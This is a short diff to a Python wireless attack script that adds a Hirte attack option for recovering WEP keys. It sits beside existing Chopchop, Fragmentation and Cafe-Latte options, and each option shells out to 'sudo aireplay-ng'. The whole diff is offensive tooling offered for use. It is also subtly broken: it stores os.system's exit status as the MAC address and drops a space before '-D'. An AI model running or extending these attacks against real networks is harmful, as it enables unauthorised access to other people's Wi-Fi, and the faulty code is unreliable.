@@ -8,6 +8,7 @@ def injectionMenu():
 	print("3. Attempt Chopchop attack (WEP)")
 	print("4. Attempt Fragmentation attack (WEP)")
 	print("5. Obtain WEP key via Cafe-Latte attack")
+	print("6. Obtain WEP key via Hirte attack")
 
 def injectionInput(config):
 	injectionMenu()
@@ -24,6 +25,8 @@ def injectionInput(config):
 		fragment(config)
 	elif command == "5":
 		cafelatte(config)
+	elif command == "6":
+		hirte(config)
 	#Return to the main menu
 	else:
 		return
@@ -67,4 +70,11 @@ def cafelatte(config):
 	local_mac = os.system("ethtool -P " + nic + " | awk '{ print $NF };'")
 	bssid = config['ap']['bssid']
 	cmd = "sudo aireplay-ng -6 -b " + bssid + " -h " + local_mac + "-D " + nic
+	os.system(cmd)
+
+def hirte(config):
+	#Aireplay command to perform a hirte attack
+	nic = config['host']['nic']
+	local_mac = os.system("ethtool -P " + nic + " | awk '{ print $NF };'")
+	cmd = "sudo aireplay-ng -7 -h " + local_mac + "-D " + nic
 	os.system(cmd)
